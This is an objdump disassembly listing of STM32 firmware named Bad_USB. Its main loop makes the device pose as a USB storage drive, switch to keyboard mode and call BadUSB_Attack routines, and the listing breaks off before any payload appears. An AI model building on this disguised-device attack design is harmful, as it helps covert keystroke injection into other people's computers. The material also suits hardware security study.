
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000cf30  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000228  0800d0bc  0800d0bc  0001d0bc  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d2e4  0800d2e4  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d2e4  0800d2e4  0001d2e4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d2ec  0800d2ec  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d2ec  0800d2ec  0001d2ec  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d2f0  0800d2f0  0001d2f0  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d2f4  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d534  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d534  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020aa7  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 0000538c  00000000  00000000  00040d5a  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460e8  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c20  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  0002660f  00000000  00000000  000490e7  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b5b  00000000  00000000  0006f6f6  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d248a  00000000  00000000  00095251  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f6c  00000000  00000000  001676dc  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e648  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d0a4 	.word	0x0800d0a4

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d0a4 	.word	0x0800d0a4

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb86 	bl	8001c4c <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 fa0e 	bl	8001978 <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 fa00 	bl	8001978 <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fdd0 	bl	8001132 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f85b 	bl	800064c <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fd07 	bl	8000fac <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb9f 	bl	8000ce0 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b25      	ldr	r3, [pc, #148]	; (800063c <main+0xb4>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  uint32_t Flash_Busy;
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b ff38 	bl	800c420 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	4822      	ldr	r0, [pc, #136]	; (8000640 <main+0xb8>)
 80005b6:	f00c fd3b 	bl	800d030 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	4821      	ldr	r0, [pc, #132]	; (8000644 <main+0xbc>)
 80005c0:	f000 fa6c 	bl	8000a9c <InterruptTrap>
	  Flash_Busy = __HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY);
 80005c4:	4b20      	ldr	r3, [pc, #128]	; (8000648 <main+0xc0>)
 80005c6:	691b      	ldr	r3, [r3, #16]
 80005c8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80005cc:	2b00      	cmp	r3, #0
 80005ce:	bf14      	ite	ne
 80005d0:	2301      	movne	r3, #1
 80005d2:	2300      	moveq	r3, #0
 80005d4:	b2db      	uxtb	r3, r3
 80005d6:	603b      	str	r3, [r7, #0]
	  switch(flag){
 80005d8:	687b      	ldr	r3, [r7, #4]
 80005da:	2b01      	cmp	r3, #1
 80005dc:	d003      	beq.n	80005e6 <main+0x5e>
 80005de:	687b      	ldr	r3, [r7, #4]
 80005e0:	2b02      	cmp	r3, #2
 80005e2:	d018      	beq.n	8000616 <main+0x8e>
		  }
		  flag = 0;
		  SwitchToMSC();
		  break;
	  default:
		  break;
 80005e4:	e028      	b.n	8000638 <main+0xb0>
		  HAL_Delay(10000);
 80005e6:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ea:	f000 fe17 	bl	800121c <HAL_Delay>
			  if(!Flash_Busy){
 80005ee:	683b      	ldr	r3, [r7, #0]
 80005f0:	2b00      	cmp	r3, #0
 80005f2:	d1fc      	bne.n	80005ee <main+0x66>
				  SwitchToHID();
 80005f4:	f000 f8a2 	bl	800073c <SwitchToHID>
				  while(!TestHID());
 80005f8:	bf00      	nop
 80005fa:	f000 fa6d 	bl	8000ad8 <TestHID>
 80005fe:	4603      	mov	r3, r0
 8000600:	2b00      	cmp	r3, #0
 8000602:	d0fa      	beq.n	80005fa <main+0x72>
				  BadUSB_Attack(0);
 8000604:	2000      	movs	r0, #0
 8000606:	f000 fa91 	bl	8000b2c <BadUSB_Attack>
				  break;
 800060a:	bf00      	nop
		  flag = 2;
 800060c:	2302      	movs	r3, #2
 800060e:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 8000610:	f000 f8ac 	bl	800076c <SwitchToMSC>
		  break;
 8000614:	e010      	b.n	8000638 <main+0xb0>
		  HAL_Delay(20000);
 8000616:	f644 6020 	movw	r0, #20000	; 0x4e20
 800061a:	f000 fdff 	bl	800121c <HAL_Delay>
			  if(!Flash_Busy){
 800061e:	683b      	ldr	r3, [r7, #0]
 8000620:	2b00      	cmp	r3, #0
 8000622:	d1fc      	bne.n	800061e <main+0x96>
				  SwitchToHID();
 8000624:	f000 f88a 	bl	800073c <SwitchToHID>
				  BadUSB_Attack(1);
